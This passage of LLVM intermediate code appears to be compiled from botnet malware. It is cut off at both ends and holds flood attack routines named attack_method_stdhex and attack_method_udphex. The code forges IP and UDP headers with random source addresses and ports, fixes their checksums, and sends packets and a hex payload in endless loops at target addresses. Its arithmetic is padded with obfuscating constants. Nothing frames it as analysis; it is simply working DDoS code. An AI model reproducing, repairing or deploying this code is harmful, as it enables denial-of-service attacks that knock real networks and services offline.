  %390 = add i32 %377, %386
  %391 = call i32 @htonl(i32 %389) #8
  %392 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %370, %342
  %395 = load i32, i32* %21, align 4
  %396 = icmp eq i32 %395, -1
  br i1 %396, label %397, label %401

; <label>:397:                                    ; preds = %394
  %398 = call i32 @rand_next()
  %399 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 8
  store i32 %398, i32* %400, align 4
  br label %401

; <label>:401:                                    ; preds = %397, %394
  %402 = load i16, i16* %13, align 2
  %403 = zext i16 %402 to i32
  %404 = icmp eq i32 %403, 65535
  br i1 %404, label %405, label %435

; <label>:405:                                    ; preds = %401
  %406 = call i32 @rand_next()
  %407 = xor i32 65535, -1
  %408 = xor i32 %406, %407
  %409 = and i32 %408, %406
  %410 = and i32 %406, 65535
  %411 = trunc i32 %409 to i16
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 3
  store i16 %411, i16* %413, align 4
  %414 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 3
  %416 = load i16, i16* %415, align 4
  %417 = zext i16 %416 to i32
  %418 = sub i32 0, 1000
  %419 = add i32 %417, %418
  %420 = sub nsw i32 %417, 1000
  %421 = xor i32 %419, -1
  %422 = and i32 1060508277, %421
  %423 = xor i32 1060508277, -1
  %424 = and i32 %419, %423
  %425 = xor i32 -1, -1
  %426 = and i32 %425, 1060508277
  %427 = and i32 -1, %423
  %428 = or i32 %422, %424
  %429 = or i32 %426, %427
  %430 = xor i32 %428, %429
  %431 = xor i32 %419, -1
  %432 = trunc i32 %430 to i16
  %433 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 3
  store i16 %432, i16* %434, align 4
  br label %435

; <label>:435:                                    ; preds = %405, %401
  %436 = load i16, i16* %16, align 2
  %437 = zext i16 %436 to i32
  %438 = icmp eq i32 %437, 65535
  br i1 %438, label %439, label %452

; <label>:439:                                    ; preds = %435
  %440 = call i32 @rand_next()
  %441 = xor i32 %440, -1
  %442 = xor i32 65535, -1
  %443 = xor i32 432764154, -1
  %444 = or i32 %441, %442
  %445 = or i32 432764154, %443
  %446 = xor i32 %444, -1
  %447 = and i32 %446, %445
  %448 = and i32 %440, 65535
  %449 = trunc i32 %447 to i16
  %450 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %451 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %450, i32 0, i32 0
  store i16 %449, i16* %451, align 2
  br label %452

; <label>:452:                                    ; preds = %439, %435
  %453 = load i16, i16* %17, align 2
  %454 = zext i16 %453 to i32
  %455 = icmp eq i32 %454, 65535
  br i1 %455, label %456, label %465

; <label>:456:                                    ; preds = %452
  %457 = call i32 @rand_next()
  %458 = xor i32 65535, -1
  %459 = xor i32 %457, %458
  %460 = and i32 %459, %457
  %461 = and i32 %457, 65535
  %462 = trunc i32 %460 to i16
  %463 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %464 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %463, i32 0, i32 1
  store i16 %462, i16* %464, align 2
  br label %465

; <label>:465:                                    ; preds = %456, %452
  %466 = load i8, i8* %20, align 1
  %467 = icmp ne i8 %466, 0
  br i1 %467, label %472, label %468

; <label>:468:                                    ; preds = %465
  %469 = call i32 @rand_next()
  %470 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 9
  store i32 %469, i32* %471, align 4
  br label %478

; <label>:472:                                    ; preds = %465
  %473 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 9
  %475 = load i32, i32* %474, align 4
  %476 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 9
  store i32 %475, i32* %477, align 4
  br label %478

; <label>:478:                                    ; preds = %472, %468
  %479 = load i8, i8* %19, align 1
  %480 = icmp ne i8 %479, 0
  br i1 %480, label %481, label %484

; <label>:481:                                    ; preds = %478
  %482 = load i8*, i8** %31, align 8
  %483 = load i32, i32* %18, align 4
  call void @rand_str(i8* %482, i32 %483)
  br label %484

; <label>:484:                                    ; preds = %481, %478
  %485 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %486 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %485, i32 0, i32 7
  store i16 0, i16* %486, align 2
  %487 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %488 = bitcast %struct.iphdr* %487 to i16*
  %489 = call zeroext i16 @checksum_generic(i16* %488, i32 20)
  %490 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i32 0, i32 7
  store i16 %489, i16* %491, align 2
  %492 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 7
  store i16 0, i16* %493, align 2
  %494 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %495 = bitcast %struct.iphdr* %494 to i16*
  %496 = call zeroext i16 @checksum_generic(i16* %495, i32 20)
  %497 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 7
  store i16 %496, i16* %498, align 2
  %499 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %500 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %499, i32 0, i32 3
  store i16 0, i16* %500, align 2
  %501 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %502 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %503 = bitcast %struct.udphdr* %502 to i8*
  %504 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %505 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %504, i32 0, i32 2
  %506 = load i16, i16* %505, align 2
  %507 = load i32, i32* %18, align 4
  %508 = sext i32 %507 to i64
  %509 = add i64 8, 555745098095256543
  %510 = add i64 %509, %508
  %511 = sub i64 %510, 555745098095256543
  %512 = add i64 8, %508
  %513 = trunc i64 %511 to i32
  %514 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %501, i8* %503, i16 zeroext %506, i32 %513)
  %515 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %516 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %515, i32 0, i32 3
  store i16 %514, i16* %516, align 2
  %517 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %518 = load i32, i32* %9, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %517, i64 %519
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i32 0, i32 0
  %522 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %521, i32 0, i32 0
  store i16 2, i16* %522, align 4
  %523 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 9
  %525 = load i32, i32* %524, align 4
  %526 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %527 = load i32, i32* %9, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %526, i64 %528
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i32 0, i32 0
  %531 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %530, i32 0, i32 2
  %532 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %531, i32 0, i32 0
  store i32 %525, i32* %532, align 4
  %533 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %534 = load i32, i32* %9, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i64 %535
  %537 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i32 0, i32 0
  %538 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %537, i32 0, i32 1
  store i16 0, i16* %538, align 2
  %539 = load i32, i32* %10, align 4
  %540 = load i8*, i8** %26, align 8
  %541 = load i32, i32* %18, align 4
  %542 = sext i32 %541 to i64
  %543 = sub i64 0, 52
  %544 = sub i64 0, %542
  %545 = add i64 %543, %544
  %546 = sub i64 0, %545
  %547 = add i64 52, %542
  %548 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %549 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %550 = load i32, i32* %9, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %549, i64 %551
  %553 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i32 0, i32 0
  %554 = bitcast %struct.sockaddr_in* %553 to %struct.sockaddr*
  store %struct.sockaddr* %554, %struct.sockaddr** %548, align 8
  %555 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %556 = load %struct.sockaddr*, %struct.sockaddr** %555, align 8
  %557 = call i64 @sendto(i32 %539, i8* %540, i64 %546, i32 16384, %struct.sockaddr* %556, i32 16)
  br label %558

; <label>:558:                                    ; preds = %484
  %559 = load i32, i32* %9, align 4
  %560 = sub i32 %559, 2032693808
  %561 = add i32 %560, 1
  %562 = add i32 %561, 2032693808
  %563 = add nsw i32 %559, 1
  store i32 %562, i32* %9, align 4
  br label %337

; <label>:564:                                    ; preds = %337
  br label %336

; <label>:565:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #7
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #7
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1294)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp eq i32 %50, 65535
  br i1 %51, label %52, label %55

; <label>:52:                                     ; preds = %4
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  br label %58

; <label>:55:                                     ; preds = %4
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #8
  store i16 %57, i16* %13, align 2
  br label %58

; <label>:58:                                     ; preds = %55, %52
  store i32 0, i32* %9, align 4
  br label %59

; <label>:59:                                     ; preds = %174, %58
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %180

; <label>:64:                                     ; preds = %59
  %65 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %66 = load i8**, i8*** %10, align 8
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8*, i8** %66, i64 %68
  store i8* %65, i8** %69, align 8
  %70 = load i16, i16* %12, align 2
  %71 = zext i16 %70 to i32
  %72 = icmp eq i32 %71, 65535
  br i1 %72, label %73, label %82

; <label>:73:                                     ; preds = %64
  %74 = call i32 @rand_next()
  %75 = trunc i32 %74 to i16
  %76 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %77 = load i32, i32* %9, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 0
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %80, i32 0, i32 1
  store i16 %75, i16* %81, align 2
  br label %91

; <label>:82:                                     ; preds = %64
  %83 = load i16, i16* %12, align 2
  %84 = call zeroext i16 @htons(i16 zeroext %83) #8
  %85 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %86 = load i32, i32* %9, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 0
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %89, i32 0, i32 1
  store i16 %84, i16* %90, align 2
  br label %91

; <label>:91:                                     ; preds = %82, %73
  %92 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %93 = load i32*, i32** %11, align 8
  %94 = load i32, i32* %9, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i32, i32* %93, i64 %95
  store i32 %92, i32* %96, align 4
  %97 = icmp eq i32 %92, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %91
  ret void

; <label>:99:                                     ; preds = %91
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load i16, i16* %13, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %101, i16* %102, align 2
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %104 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %103, i32 0, i32 0
  store i32 0, i32* %104, align 4
  %105 = load i32*, i32** %11, align 8
  %106 = load i32, i32* %9, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %111 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %111, %struct.sockaddr** %110, align 8
  %112 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %113 = load %struct.sockaddr*, %struct.sockaddr** %112, align 8
  %114 = call i32 @bind(i32 %109, %struct.sockaddr* %113, i32 16) #7
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %99
  br label %117

; <label>:117:                                    ; preds = %116, %99
  %118 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 2
  %123 = load i8, i8* %122, align 4
  %124 = zext i8 %123 to i32
  %125 = icmp slt i32 %124, 32
  br i1 %125, label %126, label %155

; <label>:126:                                    ; preds = %117
  %127 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %128 = load i32, i32* %9, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i64 %129
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i32 0, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @ntohl(i32 %132) #8
  %134 = call i32 @rand_next()
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = lshr i32 %134, %141
  %143 = add i32 %133, 1640872490
  %144 = add i32 %143, %142
  %145 = sub i32 %144, 1640872490
  %146 = add i32 %133, %142
  %147 = call i32 @htonl(i32 %145) #8
  %148 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 0
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %152, i32 0, i32 2
  %154 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %153, i32 0, i32 0
  store i32 %147, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %126, %117
  %156 = load i32*, i32** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 0
  %167 = bitcast %struct.sockaddr_in* %166 to %struct.sockaddr*
  store %struct.sockaddr* %167, %struct.sockaddr** %161, align 8
  %168 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %169 = load %struct.sockaddr*, %struct.sockaddr** %168, align 8
  %170 = call i32 @connect(i32 %160, %struct.sockaddr* %169, i32 16)
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %155
  br label %173

; <label>:173:                                    ; preds = %172, %155
  br label %174

; <label>:174:                                    ; preds = %173
  %175 = load i32, i32* %9, align 4
  %176 = add i32 %175, 1510309547
  %177 = add i32 %176, 1
  %178 = sub i32 %177, 1510309547
  %179 = add nsw i32 %175, 1
  store i32 %178, i32* %9, align 4
  br label %59

; <label>:180:                                    ; preds = %59
  %181 = load i8*, i8** @hexPayload, align 8
  %182 = call i64 @strlen(i8* %181) #10
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %22, align 4
  br label %184

; <label>:184:                                    ; preds = %227, %180
  store i32 0, i32* %9, align 4
  br label %185

; <label>:185:                                    ; preds = %221, %184
  %186 = load i32, i32* %9, align 4
  %187 = load i8, i8* %5, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp slt i32 %186, %188
  br i1 %189, label %190, label %227

; <label>:190:                                    ; preds = %185
  %191 = load i8**, i8*** %10, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i8*, i8** %191, i64 %193
  %195 = load i8*, i8** %194, align 8
  store i8* %195, i8** %23, align 8
  %196 = load i8, i8* %15, align 1
  %197 = icmp ne i8 %196, 0
  br i1 %197, label %198, label %202

; <label>:198:                                    ; preds = %190
  %199 = load i8*, i8** %23, align 8
  %200 = load i16, i16* %14, align 2
  %201 = zext i16 %200 to i32
  call void @rand_str(i8* %199, i32 %201)
  br label %202

; <label>:202:                                    ; preds = %198, %190
  %203 = load i32*, i32** %11, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds i32, i32* %203, i64 %205
  %207 = load i32, i32* %206, align 4
  %208 = load i8*, i8** %23, align 8
  %209 = load i16, i16* %14, align 2
  %210 = zext i16 %209 to i64
  %211 = call i64 @send(i32 %207, i8* %208, i64 %210, i32 16384)
  %212 = load i32*, i32** %11, align 8
  %213 = load i32, i32* %9, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds i32, i32* %212, i64 %214
  %216 = load i32, i32* %215, align 4
  %217 = load i8*, i8** @hexPayload, align 8
  %218 = load i32, i32* %22, align 4
  %219 = sext i32 %218 to i64
  %220 = call i64 @send(i32 %216, i8* %217, i64 %219, i32 16384)
  br label %221

; <label>:221:                                    ; preds = %202
  %222 = load i32, i32* %9, align 4
  %223 = add i32 %222, -1755271712
  %224 = add i32 %223, 1
  %225 = sub i32 %224, -1755271712
  %226 = add nsw i32 %222, 1
  store i32 %225, i32* %9, align 4
  br label %185

; <label>:227:                                    ; preds = %185
  br label %184
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udphex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1294)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #8
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %174, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %180

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #8
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #7
  %114 = icmp eq i32 %113, -1
